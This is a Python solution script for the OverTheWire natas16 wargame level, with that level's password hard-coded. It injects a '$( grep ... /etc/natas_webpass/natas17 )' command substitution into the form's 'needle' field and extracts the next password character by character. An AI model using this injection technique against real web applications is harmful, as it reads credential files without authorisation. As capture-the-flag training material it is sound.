#!/usr/bin/env python
import requests
import re
import string

# Set the username and password for the natas16 level
username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

# Define the set of characters to try
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Build the URL for the natas16 level
url = 'http://%s.natas.labs.overthewire.org/' % username

# Start a new session
session = requests.Session()

# Keep trying passwords until we have the entire 32-character password
seen_password = []
while len(seen_password) < 32:

    # Try each character in the charset
    for char in charset:
        # Build the command to execute
        command = "anything$( grep ^"+"".join(seen_password)+char+" /etc/natas_webpass/natas17 )"

        # Send the command as the "needle" parameter in a POST request
        response = session.post(url, data={"needle": command}, auth=(username, password))

        # Extract the response content
        content = response.text

        # Search for the password in the response content
        matches = re.findall('<pre>(.*)</pre>', content)

        # If we found a match, this character is part of the password
        if len(matches) > 0:
            seen_password.append(char)
            print("".join(seen_password))
            break

# Print the entire password
print("".join(seen_password))
